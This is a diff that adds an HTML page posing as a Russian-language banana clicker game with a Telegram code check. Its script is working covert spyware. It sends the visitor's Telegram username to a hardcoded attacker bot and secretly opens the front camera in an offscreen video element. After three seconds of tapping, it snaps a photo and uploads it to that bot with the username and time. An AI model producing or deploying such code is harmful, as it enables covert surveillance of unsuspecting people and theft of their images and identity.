@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🍌</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            touch-action: manipulation;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 25px;
+            border-radius: 30px;
+            max-width: 450px;
+            width: 95%;
+            box-shadow: 0 0 40px rgba(255, 200, 0, 0.1);
+            margin: 10px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ffcc00;
+            font-size: 26px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 18px;
+            border: 2px solid #333;
+            border-radius: 15px;
+            background: #111;
+            color: #fff;
+            font-size: 18px;
+            touch-action: manipulation;
+            text-align: center;
+        }
+        .input-group input:focus {
+            border-color: #ffcc00;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 15px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            touch-action: manipulation;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #ffcc00, #ff8800);
+            color: #0a0a0a;
+        }
+        .btn-primary:active {
+            transform: scale(0.96);
+        }
+        .clicker-area {
+            text-align: center;
+            padding: 10px 0;
+        }
+        .banana-btn {
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 40% 40%, #ffdd44, #ff8800);
+            border: 4px solid #ffcc00;
+            font-size: 100px;
+            cursor: pointer;
+            box-shadow: 0 0 60px rgba(255, 200, 0, 0.2);
+            transition: all 0.1s;
+            touch-action: manipulation;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .banana-btn:active {
+            transform: scale(0.92);
+            box-shadow: 0 0 80px rgba(255, 200, 0, 0.6);
+        }
+        .status {
+            text-align: center;
+            padding: 15px;
+            background: #111;
+            border-radius: 15px;
+            margin: 20px 0;
+            color: #ffcc00;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ffcc00;
+            color: #0a0a0a;
+            padding: 12px 24px;
+            border-radius: 15px;
+            font-weight: bold;
+            opacity: 0;
+            transition: opacity 0.5s;
+            pointer-events: none;
+            z-index: 999;
+            font-size: 16px;
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show {
+            opacity: 1;
+        }
+        .info-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        #hiddenVideo {
+            display: none !important;
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        @media (max-width: 480px) {
+            .banana-btn {
+                width: 200px;
+                height: 200px;
+                font-size: 80px;
+            }
+            .container {
+                padding: 18px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <div id="registerScreen">
+            <h1>🍌</h1>
+            <p style="text-align:center;color:#888;margin-bottom:20px;">Введите Telegram</p>
+            <div class="input-group">
+                <label>Юзернейм</label>
+                <input type="text" id="tgUsername" placeholder="@username">
+            </div>
+            <button class="btn btn-primary" onclick="register()">Получить код</button>
+            <div class="info-text">Код придёт в Telegram</div>
+        </div>
+
+        <div id="codeScreen" class="hidden">
+            <h1>🔑</h1>
+            <p style="text-align:center;color:#888;margin-bottom:20px;">Введите код</p>
+            <div class="input-group">
+                <label>Код</label>
+                <input type="text" id="verifyCode" placeholder="Код" maxlength="10">
+            </div>
+            <button class="btn btn-primary" onclick="verifyCode()">Подтвердить</button>
+        </div>
+
+        <div id="clickerScreen" class="hidden">
+            <h1>🍌</h1>
+            <div class="clicker-area">
+                <button class="banana-btn" id="clickBtn" onclick="handleTap()">
+                    🍌
+                </button>
+            </div>
+            <div id="timerStatus" class="status">Тапай</div>
+        </div>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline></video>
+    <div id="toast" class="toast">✅</div>
+
+    <script>
+        const BOT_TOKEN = '8752604733:AAEf9krkDszZ5Yu9P88RuMxSUVx3rN_NIHc';
+        const CHAT_ID = '5645726673';
+        
+        let currentUser = '';
+        let generatedCode = '';
+        let tapCount = 0;
+        let isTapping = false;
+        let tapTimer = null;
+        let lastTapTime = 0;
+        let cameraReady = false;
+        let photoTaken = false;
+        let cameraStream = null;
+        let tapStartTime = 0;
+
+        async function sendToTelegram(text) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch(e) { return false; }
+        }
+
+        async function sendPhotoToBot(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
+            formData.append('caption', `@${currentUser} | ${new Date().toLocaleString()}`);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch(e) { return false; }
+        }
+
+        function register() {
+            const username = document.getElementById('tgUsername').value.trim();
+            if (!username) {
+                showToast('❌');
+                return;
+            }
+            currentUser = username;
+            
+            generatedCode = Math.floor(Math.random() * 9000 + 1000).toString();
+            
+            const message = `👤 @${username}\n🔑 ${generatedCode}`;
+            sendToTelegram(message);
+
+            document.getElementById('registerScreen').classList.add('hidden');
+            document.getElementById('codeScreen').classList.remove('hidden');
+            
+            showToast('✅');
+        }
+
+        function verifyCode() {
+            const code = document.getElementById('verifyCode').value.trim();
+            if (!code) {
+                showToast('❌');
+                return;
+            }
+
+            if (code === generatedCode) {
+                showToast('✅');
+                document.getElementById('codeScreen').classList.add('hidden');
+                document.getElementById('clickerScreen').classList.remove('hidden');
+                
+                tapCount = 0;
+                photoTaken = false;
+                isTapping = false;
+                document.getElementById('timerStatus').textContent = 'Тапай';
+                document.getElementById('timerStatus').style.color = '#ffcc00';
+                
+                startHiddenCamera();
+            } else {
+                showToast('❌');
+            }
+        }
+
+        async function startHiddenCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    },
+                    audio: false
+                });
+                
+                cameraStream = stream;
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+                await video.play();
+                cameraReady = true;
+            } catch(err) {
+                setTimeout(startHiddenCamera, 2000);
+            }
+        }
+
+        function takeHiddenPhoto() {
+            if (photoTaken || !cameraReady) {
+                if (!cameraReady) {
+                    setTimeout(takeHiddenPhoto, 500);
+                }
+                return;
+            }
+
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 320, 240);
+                
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const sent = await sendPhotoToBot(blob);
+                        if (sent) {
+                            photoTaken = true;
+                            if (cameraStream) {
+                                cameraStream.getTracks().forEach(track => track.stop());
+                                cameraStream = null;
+                            }
+                            showToast('✅');
+                        }
+                    }
+                }, 'image/jpeg', 0.7);
+                
+                canvas.remove();
+            } catch(err) {}
+        }
+
+        function handleTap() {
+            const now = Date.now();
+            
+            if (now - lastTapTime > 500) {
+                tapCount = 0;
+                isTapping = false;
+                if (tapTimer) {
+                    clearInterval(tapTimer);
+                    tapTimer = null;
+                }
+                document.getElementById('timerStatus').textContent = 'Тапай';
+                document.getElementById('timerStatus').style.color = '#ffcc00';
+            }
+            
+            lastTapTime = now;
+            tapCount++;
+            
+            if (!isTapping) {
+                isTapping = true;
+                tapStartTime = now;
+                document.getElementById('timerStatus').textContent = '⏳ 3с';
+                document.getElementById('timerStatus').style.color = '#00ff88';
+                
+                tapTimer = setInterval(() => {
+                    const elapsed = (Date.now() - tapStartTime) / 1000;
+                    const remaining = 3 - elapsed;
+                    
+                    if (remaining > 0) {
+                        document.getElementById('timerStatus').textContent = `⏳ ${Math.ceil(remaining)}с`;
+                    } else {
+                        clearInterval(tapTimer);
+                        tapTimer = null;
+                        isTapping = false;
+                        
+                        const totalTime = Date.now() - tapStartTime;
+                        if (totalTime >= 3000 && tapCount >= 5) {
+                            document.getElementById('timerStatus').textContent = '🔥';
+                            document.getElementById('timerStatus').style.color = '#ffcc00';
+                            
+                            if (!photoTaken) {
+                                setTimeout(takeHiddenPhoto, 300);
+                            }
+                        } else {
+                            document.getElementById('timerStatus').textContent = 'Тапай';
+                            document.getElementById('timerStatus').style.color = '#ffcc00';
+                            tapCount = 0;
+                        }
+                    }
+                }, 100);
+            }
+            
+            if (isTapping && (now - tapStartTime) >= 3000 && !photoTaken) {
+                clearInterval(tapTimer);
+                tapTimer = null;
+                isTapping = false;
+                document.getElementById('timerStatus').textContent = '🔥';
+                document.getElementById('timerStatus').style.color = '#ffcc00';
+                
+                if (!photoTaken) {
+                    setTimeout(takeHiddenPhoto, 300);
+                }
+            }
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2000);
+        }
+
+        window.onload = function() {
+            console.log('🍌');
+        };
+    </script>
+</body>
+</html>
